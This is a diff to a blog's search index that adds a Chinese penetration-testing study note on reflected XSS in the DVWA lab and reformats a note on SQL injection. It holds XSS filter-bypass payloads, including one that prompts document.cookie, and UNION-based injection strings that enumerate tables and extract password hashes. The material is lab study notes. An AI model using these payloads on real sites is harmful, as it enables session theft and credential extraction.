@@ -1,9 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[[渗透学习]8.XSS]]></title>
+    <url>%2F2019%2F09%2F04%2F%E9%80%8F%E5%AD%A6%E4%B9%A0-8-XSS%2F</url>
+    <content type="text"><![CDATA[反射型XSS XSS 反射型XSS 1. DVWA安全级别为低时 源码为 123456789101112131415 &lt;?phpif(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;$isempty = true;&#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Hello &apos; . $_GET[&apos;name&apos;]; echo &apos;&lt;/pre&gt;&apos;; &#125;?&gt; 输入```123![跳出弹窗](/images/渗透学习-8-XSS/low_xss.png)### 2. DVWA安全级别为中时源码为 123只是将```&lt;script&gt;```屏蔽了#### 1.大小写绕过输入```&lt;SCRIPT&gt;alert(&apos;ccc&apos;)&lt;/SCRIPT&gt; 2.双写绕过 输入12#### 3.避开被过滤的符号，转换脚本样式输入```&lt;img src=&quot;https://www.baidu.com&quot; onmouseover=prompt(document.cookie) /&gt; onmouseover 事件会在鼠标指针移动到指定的对象上时发生 prompt() 方法用于显示可提示用户进行输入的对话框 或者输入onfocus12345onfocus 事件在对象获得焦点时发生![点击构造的输入框](/images/渗透学习-8-XSS/mid_xss3.png)### 3.DVWA安全级别为高时源码为 1[htmlspecialchars的作用](https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp) htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; &quot; （双引号）成为 &quot; ' （单引号）成为 ' &lt; （小于）成为 &lt; （大于）成为 &gt; 也就是说输入```&lt;script&gt;```就会输出```&lt;script&gt;```,而不是将其作为脚本 没办法 --- 参考资料:[DVWA之跨站脚本攻击漏洞测试01-反射型XSS](https://www.jianshu.com/p/c6ed01e6f905)]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[[渗透学习]7.Sql注入]]></title>
     <url>%2F2019%2F09%2F03%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"><![CDATA[基本的Sql注入过程 Sql注入 先将DVWA的安全防护等级调为ｌｏｗ 输入' or 1=1 -- ' '--'表示sql中的注释符 输入' union select 1,2 -- ' 可知数据表有两列 输入' union select 1, column_name from INFORMATION_SCHEMA.tables -- ' 查询INFORMATION_SCHEMA系统表 输入' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' 输入' union select null, password from users -- ' 得到密码的md5值 输入' union select password, concat(first_name, ' ', last_name, ' ',user) from users -- ']]></content>
+    <content type="text"><![CDATA[基本的Sql注入过程 Sql注入 先将DVWA的安全防护等级调为ｌｏｗ 1. 输入' or 1=1 -- ' '--'表示sql中的注释符 2. 输入' union select 1,2 -- ' 可知数据表有两列 3. 输入' union select 1, column_name from INFORMATION_SCHEMA.tables -- ' 查询INFORMATION_SCHEMA系统表 4. 输入' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' 5. 输入' union select null, password from users -- ' 得到密码的md5值 6. 输入' union select password, concat(first_name, ' ', last_name, ' ',user) from users -- ']]></content>
   </entry>
   <entry>
     <title><![CDATA[[渗透学习]6.Web应用渗透技术]]></title>
